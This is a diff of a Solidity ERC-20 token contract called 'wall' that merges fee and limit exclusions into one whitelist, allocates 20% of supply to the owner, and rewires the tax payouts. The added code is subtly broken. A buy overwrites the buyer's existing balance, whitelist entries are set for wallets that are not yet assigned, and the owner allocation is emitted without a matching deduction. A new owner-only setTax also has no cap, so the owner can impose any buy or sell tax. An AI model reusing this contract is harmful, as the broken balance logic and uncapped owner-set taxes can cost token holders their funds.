@@ -91,11 +91,9 @@ contract wall is IERC20, Ownable {
     uint8 private constant _decimals = 18;
     mapping (address => uint256) private balances;
     mapping (address => mapping (address => uint256)) private _allowances;
-    
     // Token number and initial supply
     uint256 private _totalSupply = 21000000000 * 10**18; 
     uint256 private constant _initialTotalSupply = 21000000000 * 10**18; 
-
     mapping (address => bool) public automatedMarketMakerPairs;
     bool private isLiquidityAdded = false;
     address public liquidityWallet;
@@ -103,41 +101,30 @@ contract wall is IERC20, Ownable {
     address public investmentWallet;
     address public devWallet;
     uint256 private _launchTimestamp;
-    mapping (address => uint256) private addressAmount;
     address public constant deadWallet = 0x000000000000000000000000000000000000dEaD;
-    mapping (address => bool) private _isExcludedFromMaxWalletLimit;
-    mapping (address => bool) private _isExcludedFromMaxTransactionLimit;
-    mapping (address => bool) private _isExcludedFromFee;
     uint256 public maxTxAmount = _totalSupply;
     uint256 public maxWalletAmount = _totalSupply;
     uint private launchBlock;   // When contract was launched
-
     /* Invariable TAX AMOUNT */
     uint constant buyTaxCostant = 4;
     uint constant sellTaxCostant = 4;
     uint constant trasferTaxCostant = 1;
-
     /* Tax for operations */
     uint sellTax = sellTaxCostant;
     uint buyTax = buyTaxCostant;
     uint transferTax = trasferTaxCostant;
-
     /* Tax percentage for different use */
     uint256 toMarketing;
     uint256 toDev;
     uint256 toInvestment;
-
     /* Value of the new calculated wall */
     uint calculatedNewWall = 0;         // Initial state
     uint arrayOfETHLPValueLength;       // Will contain the lenth of the LPETH value array
-
     /* Setting up whitelist */
     mapping (address =>bool) private whitelistedWallet;
-
     /* This will create the wall based on market cap */
     uint256 ethWallCurrent = 0;             // WEI 10**18 precision
     uint256 ethInLPBeforeTransfer;          // WEI 10**18 precision
-    
     uint256 minimumTokensBeforeSwap = _totalSupply * 250 / 1000000; // .025%
     // Track pair address
     address public pairAddressOfTokenETH;
@@ -148,19 +135,23 @@ contract wall is IERC20, Ownable {
         IRouter _uniswapV2Router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); 
         uniswapV2Router = _uniswapV2Router;
         liquidityWallet = owner();
-        _isExcludedFromFee[owner()] = true;
-        _isExcludedFromFee[address(this)] = true;
-        _isExcludedFromFee[deadWallet] = true;
-        _isExcludedFromMaxWalletLimit[address(uniswapV2Router)] = true;
-        _isExcludedFromMaxWalletLimit[address(this)] = true;
-        _isExcludedFromMaxWalletLimit[owner()] = true;
-        _isExcludedFromMaxWalletLimit[deadWallet] = true;
-        _isExcludedFromMaxTransactionLimit[address(uniswapV2Router)] = true;
-        _isExcludedFromMaxTransactionLimit[address(this)] = true;
-        _isExcludedFromMaxTransactionLimit[owner()] = true;
-        _isExcludedFromMaxTransactionLimit[deadWallet] = true;
-        balances[address(this)] = _totalSupply;
-        emit Transfer(address(0), address(this), _totalSupply);
+        whitelistedWallet[address(uniswapV2Router)] = true;
+        whitelistedWallet[address(this)] = true;
+        whitelistedWallet[devWallet] = true;
+        whitelistedWallet[marketingWallet] = true;
+        whitelistedWallet[investmentWallet] = true;
+        whitelistedWallet[owner()] = true;
+        whitelistedWallet[deadWallet] = true;
+
+        // Fill owner's wallet with 20% of token for marketing and staking purpose
+        uint256 tokenToAllocateForMarketing = (_totalSupply * 20)/100;
+        balances[liquidityWallet] = tokenToAllocateForMarketing;
+        emit Transfer(address(this), liquidityWallet, tokenToAllocateForMarketing);
+
+        // Fill contract with tokens for public sale
+        uint256 amountAllocatedForPublicSale = _totalSupply - (_totalSupply * 20)/100;
+        balances[address(this)] = amountAllocatedForPublicSale;
+        emit Transfer(address(0), address(this), amountAllocatedForPublicSale);
     }
 
     receive() external payable {
@@ -208,10 +199,6 @@ contract wall is IERC20, Ownable {
         (bool success,) = address(owner()).call{value : amount}("");
         require(success, "error withdrawing ETH from contract.");
     }
-    function excludeFromMaxWalletLimit(address account, bool excluded) external onlyOwner {
-        require(_isExcludedFromMaxWalletLimit[account] != excluded, "wallet address already excluded.");
-        _isExcludedFromMaxWalletLimit[account] = excluded;
-    }
 
     function setMaxWalletAmount(uint256 newValue) external onlyOwner {
         require(newValue != maxWalletAmount, "cannot update maxWalletAmount to same value.");
@@ -237,20 +224,11 @@ contract wall is IERC20, Ownable {
         maxWalletAmount = _totalSupply * 5 / 100; //  5%
         maxTxAmount = _totalSupply * 5 / 100;     //  5%
         // Exclude system wallet to limit
-        // Uniswap master address
-        _isExcludedFromMaxWalletLimit[_uniswapV2Pair] = true;
-        _isExcludedFromMaxTransactionLimit[_uniswapV2Pair] = true;
-        // Dev wallet
-        _isExcludedFromMaxWalletLimit[devWallet] = true;
-        _isExcludedFromMaxTransactionLimit[devWallet] = true;
-        // Investment wallet
-        _isExcludedFromMaxWalletLimit[investmentWallet] = true;
-        _isExcludedFromMaxTransactionLimit[investmentWallet] = true;
+        whitelistedWallet[_uniswapV2Pair] = true;
         // Register pair in global variable
         pairAddressOfTokenETH = _uniswapV2Pair;
         // Register when trading was activated
         launchBlock = block.number;
-
     }
 
     function _setAutomatedMarketMakerPair(address pair, bool value) private {
@@ -274,19 +252,14 @@ contract wall is IERC20, Ownable {
         if (from == uniswapV2Pair)  {
 
             // Check if the wallet is whitelisted or not
-            if(checkWalletForWhitelisting(to))  {
-                buyTax = 0;
-            }
-            
-            if (!_isExcludedFromMaxTransactionLimit[to]) {
+            if(checkWalletForWhitelisting(to))  { buyTax = 0; }
+
+            if (!whitelistedWallet[to]) {
+                require((balanceOf(to) + amount) <= maxWalletAmount, "expected wallet amount exceeds the maxWalletAmount.");
                 require(amount <= maxTxAmount, "transfer amount exceeds the maxTxAmount.");
             }
-
-            if (!_isExcludedFromMaxWalletLimit[to]) {
-                require((balanceOf(to) + amount) <= maxWalletAmount, "expected wallet amount exceeds the maxWalletAmount.");
-            }
             // Execute transaction
-            addressAmount[to] = amount;
+            balances[to] = amount;
             balances[from] -= amount;
             balances[to] += amount - (amount * (buyTax) / 100);
             
@@ -335,15 +308,15 @@ contract wall is IERC20, Ownable {
 
                 // Execute funds transfer
                 payable(marketingWallet).transfer(toMarketing);
-                payable(marketingWallet).transfer(toDev);
-                payable(marketingWallet).transfer(toInvestment);
+                payable(devWallet).transfer(toDev);
+                payable(investmentWallet).transfer(toInvestment);
 
             }
         }
 
         if (to == uniswapV2Pair)    {
 
-            if (!_isExcludedFromMaxTransactionLimit[from]) {
+            if (!whitelistedWallet[from]) {
                 require(amount <= maxTxAmount, "transfer amount exceeds the maxTxAmount.");
             }
             
@@ -354,9 +327,7 @@ contract wall is IERC20, Ownable {
             }
             
             // Check if the wallet is whitelisted or not
-            if(checkWalletForWhitelisting(from))  {
-                sellTax = 0;
-            }
+            if(checkWalletForWhitelisting(from))  { sellTax = 0; }
             
             // Execute transfer
             balances[from] -= amount;
@@ -391,58 +362,25 @@ contract wall is IERC20, Ownable {
 
                 // Execute funds transfer
                 payable(marketingWallet).transfer(toMarketing);
-                payable(marketingWallet).transfer(toDev);
-                payable(marketingWallet).transfer(toInvestment);
+                payable(devWallet).transfer(toDev);
+                payable(investmentWallet).transfer(toInvestment);
             }
             // Set sell tax to normal value
             sellTax = sellTaxCostant;
         }
 
         if (to != uniswapV2Pair && from != uniswapV2Pair)    {
-
             // Check if the wallet is whitelisted or not
             if(checkWalletForWhitelisting(to) && checkWalletForWhitelisting(from))  {
                 transferTax = 0;
             }
-            
-            if (!_isExcludedFromMaxWalletLimit[to] || !_isExcludedFromMaxWalletLimit[from]) {
+            if (!whitelistedWallet[to] || !whitelistedWallet[from]) {
                 require((balanceOf(to) + amount) <= maxWalletAmount, "expected wallet amount exceeds the maxWalletAmount.");
             }
-
             // Execute transfer Wallet to Wallet
             balances[from] -= amount;
-            balances[to] += amount - (amount * (transferTax) / 100);              
-
-             /* Send TAX to contract*/
-            balances[address(this)] += (amount * (transferTax)) / 100;
-            emit Transfer(from, address(this), (amount * (transferTax) / 100));              
-            /* End of sending TAX to contract */
-
-            emit Transfer(from, to, amount - (amount * (transferTax) / 100));    
-
-            if (balanceOf(address(this)) > minimumTokensBeforeSwap) {
-                _swapTokensForETH(balanceOf(address(this)));
-               
-                /* 
-                 *
-                 * Tax division:
-                 *
-                 * Marketing: 30%
-                 * Dev: 30%
-                 * Investment: 40% (will be diverted to selected staking pool for community)
-                 *
-                 */ 
-                
-                // Calculate correct percentage. Little correction are to guarantee that fees are always paid to ERC20 system
-                toMarketing = (address(this).balance * 29) / 100;
-                toDev = (address(this).balance * 29) / 100;
-                toInvestment = (address(this).balance * 39) / 100;
-
-                // Execute funds transfer
-                payable(marketingWallet).transfer(toMarketing);
-                payable(marketingWallet).transfer(toDev);
-                payable(marketingWallet).transfer(toInvestment);
-            }
+            balances[to] += amount;              
+            emit Transfer(from, to, amount);    
         }
     }
 
@@ -498,67 +436,26 @@ contract wall is IERC20, Ownable {
     /* Here all the function for varius common services */
 
 
-    function setMarketingWallettAddress(address newAddress) public onlyOwner    {
-        marketingWallet = newAddress;
-        _isExcludedFromFee[marketingWallet] = true;
-        _isExcludedFromMaxTransactionLimit[marketingWallet] = true;
-        _isExcludedFromMaxWalletLimit[marketingWallet] = true;
+    function setSystemWallettAddress(address newMarketing, address newDev, address newInvestment) public onlyOwner    {
+        marketingWallet = newMarketing;
+        devWallet = newDev;
+        investmentWallet = newInvestment;
+        whitelistedWallet[newMarketing] = true;
+        whitelistedWallet[newDev] = true;
+        whitelistedWallet[newInvestment] = true;
     }
 
-    function setInvestmentWallettAddress(address newAddress) public onlyOwner    {
-        investmentWallet = newAddress;
-        _isExcludedFromFee[investmentWallet] = true;
-        _isExcludedFromMaxTransactionLimit[investmentWallet] = true;
-        _isExcludedFromMaxWalletLimit[investmentWallet] = true;
-    }
-
-    function setDevWallettAddress(address newAddress) public onlyOwner    {
-        devWallet = newAddress;
-        _isExcludedFromFee[devWallet] = true;
-        _isExcludedFromMaxTransactionLimit[devWallet] = true;
-        _isExcludedFromMaxWalletLimit[devWallet] = true;
-    }
-
-    function getMarketingWalletAddress() public view returns (address)  {
-        return marketingWallet;
-    }
-    function getInvestmentgWalletAddress() public view returns (address)  {
-        return investmentWallet;
-    }
-    function getDevWalletAddress() public view returns (address)  {
-        return devWallet;
+    function getTax() public view returns(uint,uint)   {
+        return (buyTax, sellTax);
     }
     
-    function getSellTax() public view returns(uint)   {
-        return sellTax;
-    }
-    
-    function setSellTax(uint newTax) public onlyOwner   {
-        sellTax = newTax;
-    }
-
-     function getBuyTax() public view returns(uint)   {
-        return buyTax;
-    }
-    
-    function setBuyTax(uint newTax) public onlyOwner   {
-        buyTax = newTax;
-    }
-    
-    function getTransferTax() public view returns(uint)   {
-        return transferTax;
-    }
-    
-    function setTransferTax(uint newTax) public onlyOwner   {
-        transferTax = newTax;
+    function setTax(uint newBuyTax, uint newSellTax) public onlyOwner   {
+        buyTax = newBuyTax;
+        sellTax = newSellTax;
     }
 
     function getCurrentEthWall() public view returns(uint256)   {
         return ethWallCurrent;
-    }
-
-    function setCurrentEthWall(uint256 newWall) public onlyOwner  {
-        ethWallCurrent = newWall;
     }
 
     function addToWhitelist(address addressToWhitelist) public onlyOwner    {
@@ -574,16 +471,12 @@ contract wall is IERC20, Ownable {
     function checkWalletForWhitelisting(address addressToCheck) public view returns(bool)   {
         return whitelistedWallet[addressToCheck];
     }
-
-    function getCurrentBlock() public view returns (uint)   {
-        return block.number;
-    }
-
-    function returnArrayLPETHValue(uint index) public view returns (uint256)   {
-        return ETHLPVariationOnBlocks[index];
-    }
     
     function tokenInContract() public view returns (uint256)    {
         return balances[address(this)];
+    }
+
+    function getSystemWallet() public view returns (address, address, address)  {
+        return (marketingWallet, devWallet, investmentWallet);
     }
 }
